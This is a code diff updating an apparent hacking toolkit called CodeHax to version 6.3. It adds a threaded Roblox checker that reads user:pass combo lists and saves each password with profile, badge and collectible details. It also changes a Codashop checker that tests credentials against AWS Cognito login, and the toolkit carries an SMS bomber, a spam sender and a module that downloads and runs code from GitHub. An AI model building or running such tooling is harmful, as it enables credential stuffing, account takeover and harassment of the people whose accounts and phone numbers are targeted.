@@ -2,8 +2,9 @@
 """
 Universal Python Obfuscator / Decoder + NGL Spammer + Self‑Updater + NetEase Checker
 + SMS Bomber + CODM Checker (fetched from GitHub) + Fresh Cookie Downloader + Codashop Checker
++ Roblox Checker
 Made by @ItsMeJeff, @Antraxdevz
-v6.2 – Enhanced Codashop Auth Debugging
+v6.3 – Roblox Checker Added
 """
 
 import argparse, base64, dis, hashlib, hmac, importlib, json, logging, marshal, os, random, re, shutil
@@ -25,11 +26,10 @@ try:
     from rich.table import Table
     from rich.box import DOUBLE, ROUNDED
     from rich.progress import Progress, BarColumn, TextColumn, TimeRemainingColumn
-    from rich.live import Live
     RICH_AVAILABLE = True
 except ImportError:
     RICH_AVAILABLE = False
-    Console = Panel = Prompt = Confirm = Table = Progress = BarColumn = TextColumn = TimeRemainingColumn = Live = None
+    Console = Panel = Prompt = Confirm = Table = Progress = BarColumn = TextColumn = TimeRemainingColumn = None
 
 # ---------- Optional colorama ----------
 try:
@@ -58,14 +58,14 @@ except ImportError:
 logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s", datefmt="%H:%M:%S")
 log = logging.getLogger("CodeHax")
 
-VERSION = "6.2"
+VERSION = "6.3"
 UPDATE_URL = "https://github.com/CodeHax-ItsMeJeff/CodeHax/raw/refs/heads/main/main.py"
 CODM_URL = "https://github.com/CodeHax-ItsMeJeff/CodeHax/raw/refs/heads/main/codm.py"
 FRESH_COOKIE_URL = "https://raw.githubusercontent.com/CodeHax-ItsMeJeff/CodeHax/main/fresh_cookie.txt"
 NGL_API_URL = "https://ngl.link/api/submit"
 
-# ---------- Codashop constants – UPDATE CLIENT ID HERE IF NEEDED ----------
-COGNITO_CLIENT_ID = "437f3u0sfh0h7av0rlrrjdtmsb"   # <-- Change this if outdated
+# Codashop constants
+COGNITO_CLIENT_ID = "437f3u0sfh0h7av0rlrrjdtmsb"
 COGNITO_REGION = "ap-southeast-1"
 COGNITO_URL = f"https://cognito-idp.{COGNITO_REGION}.amazonaws.com/"
 WALLET_API = "https://wallet-api.codacash.com"
@@ -537,7 +537,7 @@ Results saved to:
         self.print_results()
 
 # ----------------------------------------------------------------------
-# SMS Bomber (all service methods fully implemented)
+# SMS Bomber (full 10 services)
 # ----------------------------------------------------------------------
 @dataclass
 class APIResponse:
@@ -586,7 +586,6 @@ class SmsBomber:
                 return APIResponse(service_name=service_name, success=False, error_message=f"Unexpected error: {str(e)}")
         return APIResponse(service_name=service_name, success=False, error_message="Max retries exceeded")
 
-    # ---- Service methods ----
     def _send_s5(self, formatted_num: str) -> Tuple[str, bool, Optional[int]]:
         try:
             url = 'https://api.s5.com/player/api/v1/otp/request'
@@ -987,7 +986,7 @@ def download_fresh_cookies():
         log.error(f"Failed to download cookies: {e}")
 
 # ======================================================================
-# CODASHOP CHECKER (ENHANCED DEBUGGING)
+# CODASHOP CHECKER (with proper headers)
 # ======================================================================
 def format_date(iso_str):
     if not iso_str or iso_str == "N/A":
@@ -1038,10 +1037,12 @@ class CodashopUltimate:
         """Authenticate via Cognito with detailed debugging."""
         for attempt in range(3):
             session = requests.Session()
+            # Essential headers for Cognito
             session.headers.update({
                 "User-Agent": get_random_ua_coda(),
                 "X-Amz-Target": "AWSCognitoIdentityProviderService.InitiateAuth",
-                "Content-Type": "application/x-amz-json-1.1"
+                "Content-Type": "application/x-amz-json-1.1",
+                "Accept": "application/json"
             })
             payload = {
                 "AuthFlow": "USER_PASSWORD_AUTH",
@@ -1051,7 +1052,7 @@ class CodashopUltimate:
             }
             try:
                 resp = session.post(COGNITO_URL, json=payload, timeout=15)
-                # Debug: Print full response for troubleshooting
+                # Debug logging for non-200 responses
                 if resp.status_code != 200:
                     log.debug(f"Auth attempt {attempt+1} failed - Status: {resp.status_code}, Body: {resp.text[:200]}")
                 if resp.status_code == 200:
@@ -1089,7 +1090,11 @@ class CodashopUltimate:
 
     def api_get(self, url, token):
         session = requests.Session()
-        session.headers.update({"Authorization": token, "User-Agent": get_random_ua_coda()})
+        session.headers.update({
+            "Authorization": token,
+            "User-Agent": get_random_ua_coda(),
+            "Accept": "application/json"
+        })
         resp = session.get(url, timeout=10)
         if resp.status_code == 200:
             return resp.json().get("data")
@@ -1359,15 +1364,156 @@ def run_codashop_checker():
     except KeyboardInterrupt:
         console.print("\n[red]Interrupted by user[/red]")
 
+# ======================================================================
+# ROBOX CHECKER (NEW)
+# ======================================================================
+JEFF_LOGO = r"""
+██╗███████╗███████╗███████╗███████╗
+██║██╔════╝██╔════╝██╔════╝██╔════╝
+██║█████╗  █████╗  █████╗  █████╗
+██║██╔══╝  ██╔══╝  ██╔══╝  ██╔══╝
+██║██║     ███████╗████████╗███████╗
+╚═╝╚═╝     ╚══════╝╚══════╝╚══════╝
+"""
+
+class RobloxChecker:
+    def __init__(self):
+        self.thread_local = threading.local()
+        self.results = []
+        self.lock = threading.Lock()
+
+    def _get_session(self):
+        if not hasattr(self.thread_local, "session"):
+            s = requests.Session()
+            s.headers.update({"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"})
+            adapter = requests.adapters.HTTPAdapter(pool_connections=20, pool_maxsize=20)
+            s.mount("http://", adapter)
+            s.mount("https://", adapter)
+            self.thread_local.session = s
+        return self.thread_local.session
+
+    @staticmethod
+    def _parse_date(date_str):
+        if not date_str:
+            return "Unknown Date"
+        for fmt in ("%Y-%m-%dT%H:%M:%S.%fZ", "%Y-%m-%dT%H:%M:%SZ"):
+            try:
+                return datetime.strptime(date_str, fmt).strftime("%Y-%m-%d")
+            except ValueError:
+                pass
+        return "Unknown Date"
+
+    def _fetch_json(self, url, method="get", **kwargs):
+        session = self._get_session()
+        kwargs.setdefault("timeout", 12)
+        if method.lower() == "post":
+            resp = session.post(url, **kwargs)
+        else:
+            resp = session.get(url, **kwargs)
+        if resp.status_code != 200:
+            raise Exception(f"HTTP {resp.status_code}")
+        return resp.json()
+
+    def _get_roblox_user_info(self, username, password):
+        try:
+            lookup_url = "https://users.roblox.com/v1/usernames/users"
+            lookup = self._fetch_json(lookup_url, method="post", json={"usernames": [username]})
+            data = lookup.get("data", [])
+            if not data:
+                return None
+            user_id = data[0]["id"]
+
+            profile = self._fetch_json(f"https://users.roblox.com/v1/users/{user_id}")
+            friends = self._fetch_json(f"https://friends.roblox.com/v1/users/{user_id}/friends/count").get("count", 0)
+            followers = self._fetch_json(f"https://friends.roblox.com/v1/users/{user_id}/followers/count").get("count", 0)
+            badges = self._fetch_json(f"https://badges.roblox.com/v1/users/{user_id}/badges?limit=100").get("data", [])
+            groups = self._fetch_json(f"https://groups.roblox.com/v1/users/{user_id}/groups/roles").get("data", [])
+            collectibles = self._fetch_json(f"https://inventory.roblox.com/v1/users/{user_id}/assets/collectibles?limit=10").get("data", [])
+
+            return {
+                "USER": username,
+                "PASS": password,
+                "UserID": user_id,
+                "Username": profile.get("name", "N/A"),
+                "DisplayName": profile.get("displayName", "N/A"),
+                "ProfileURL": f"https://www.roblox.com/users/{user_id}/profile",
+                "Description": profile.get("description", "N/A"),
+                "IsBanned": profile.get("isBanned", False),
+                "AccountAgeDays": profile.get("age", "N/A"),
+                "JoinDate": self._parse_date(profile.get("created")),
+                "BadgeCount": len(badges),
+                "CollectibleCount": len(collectibles),
+                "GroupCount": len(groups),
+                "FriendCount": friends,
+                "FollowerCount": followers,
+                "Avatar": (
+                    f"https://thumbnails.roblox.com/v1/users/avatar-headshot?"
+                    f"userIds={user_id}&size=150x150&format=Png&isCircular=false"
+                )
+            }
+        except Exception as e:
+            log.debug(f"Roblox error for {username}: {e}")
+            return None
+
+    def _worker(self, username, password):
+        info = self._get_roblox_user_info(username, password)
+        with self.lock:
+            if info:
+                self.results.append(info)
+                console.print(f"[green]✅ {username}[/green]")
+            else:
+                console.print(f"[red]❌ {username} - not found or error[/red]")
+
+    def run(self):
+        console.print(JEFF_LOGO, style="cyan")
+        console.print("[yellow]            Created by JEFF[/yellow]\n")
+        file_name = rich_prompt("Enter accounts file (user:pass per line)").strip()
+        try:
+            with open(file_name, "r", encoding="utf-8", errors="ignore") as f:
+                lines = [line.strip() for line in f if line.strip() and ":" in line]
+            if not lines:
+                console.print("[red]No valid accounts found.[/red]")
+                return
+            accounts = []
+            for line in lines:
+                user, passw = line.split(":", 1)
+                accounts.append((user.strip(), passw.strip()))
+
+            os.makedirs("result", exist_ok=True)
+            output_file = "result/jeff_rblx_result.txt"
+            self.results.clear()
+            total = len(accounts)
+
+            console.print(f"\n[cyan]Checking {total} accounts...[/cyan]\n")
+            with ThreadPoolExecutor(max_workers=12) as executor:
+                futures = [executor.submit(self._worker, u, p) for u, p in accounts]
+                for _ in as_completed(futures):
+                    pass
+
+            with open(output_file, "w", encoding="utf-8") as out:
+                out.write(JEFF_LOGO + "\n")
+                out.write("            Created by Jeff\n\n")
+                for info in self.results:
+                    out.write("⪻━━━━━═『Jeff』═━━━━━⪼\n\n")
+                    for key, val in info.items():
+                        out.write(f"[+] {key}: {val}\n")
+                    out.write("\n⪻━━━━━━━━━━━━━━━━━━━⪼\n\n")
+
+            console.print(f"\n[green]Done! Results saved to {output_file}[/green]")
+        except FileNotFoundError:
+            console.print("[red]File not found.[/red]")
+        except Exception as e:
+            console.print(f"[red]Error: {e}[/red]")
+
 # ----------------------------------------------------------------------
-# Enhanced Interactive Menu with Boxed Selection
+# Updated Interactive Menu with Roblox Checker (11 options)
 # ----------------------------------------------------------------------
 def build_menu_table():
     if RICH_AVAILABLE:
         table = Table(show_header=False, box=ROUNDED, border_style="cyan")
         table.add_column(style="bold magenta", justify="center")
         table.add_column(style="bold white")
-        menu_items = [
+        items = [
             ("1", "Decode a file"),
             ("2", "Obfuscate a file"),
             ("3", "NGL Spammer"),
@@ -1376,16 +1522,17 @@ def build_menu_table():
             ("6", "CODM Checker (download & run)"),
             ("7", "Download Fresh Cookies"),
             ("8", "Codashop Checker"),
-            ("9", "Check for updates"),
-            ("10", "Exit")
+            ("9", "Roblox Checker"),
+            ("10", "Check for updates"),
+            ("11", "Exit")
         ]
-        for num, desc in menu_items:
+        for num, desc in items:
             table.add_row(f"[{num}]", desc)
         return table
     else:
         lines = []
         lines.append("┌──────────────────────────────┐")
-        lines.append("│   ★  C O D E H A X  v6.2  ★ │")
+        lines.append("│   ★  C O D E H A X  v6.3  ★ │")
         lines.append("├──────────────────────────────┤")
         lines.append("│ [1] Decode a file            │")
         lines.append("│ [2] Obfuscate a file         │")
@@ -1395,8 +1542,9 @@ def build_menu_table():
         lines.append("│ [6] CODM Checker (dl & run)  │")
         lines.append("│ [7] Download Fresh Cookies   │")
         lines.append("│ [8] Codashop Checker         │")
-        lines.append("│ [9] Check for updates        │")
-        lines.append("│ [10] Exit                    │")
+        lines.append("│ [9] Roblox Checker           │")
+        lines.append("│ [10] Check for updates       │")
+        lines.append("│ [11] Exit                    │")
         lines.append("└──────────────────────────────┘")
         return "\n".join(lines)
 
@@ -1413,7 +1561,7 @@ def interactive_menu():
                 padding=(1, 2)
             )
             console.print(menu_panel)
-            choice = rich_prompt("Select", choices=["1","2","3","4","5","6","7","8","9","10"], default="1")
+            choice = rich_prompt("Select", choices=[str(i) for i in range(1,12)], default="1")
         else:
             os.system('cls' if os.name=='nt' else 'clear')
             print(ASCII_ART)
@@ -1469,15 +1617,18 @@ def interactive_menu():
         elif choice == "8":
             run_codashop_checker()
         elif choice == "9":
-            self_update(restart=True)
+            rblx = RobloxChecker()
+            rblx.run()
         elif choice == "10":
+            self_update(restart=True)
+        elif choice == "11":
             sys.exit(0)
         else:
             print("Invalid choice.")
         input("\nPress Enter to continue...")
 
 # ----------------------------------------------------------------------
-# CLI
+# CLI (with roblox command)
 # ----------------------------------------------------------------------
 def create_parser() -> argparse.ArgumentParser:
     parser = argparse.ArgumentParser(description=f"CodeHax v{VERSION}")
@@ -1508,6 +1659,7 @@ def create_parser() -> argparse.ArgumentParser:
     subparsers.add_parser("codm", help="Download and run CODM checker from GitHub")
     subparsers.add_parser("fetchcookies", help="Download fresh_cookie.txt from GitHub")
     subparsers.add_parser("codashop", help="Run Codashop account checker")
+    subparsers.add_parser("roblox", help="Run Roblox account checker")
     subparsers.add_parser("update", help="Self-update")
     return parser
 
@@ -1554,6 +1706,9 @@ def main():
         download_fresh_cookies()
     elif args.command == "codashop":
         run_codashop_checker()
+    elif args.command == "roblox":
+        rblx = RobloxChecker()
+        rblx.run()
     elif args.command == "update":
         self_update(restart=True)
 
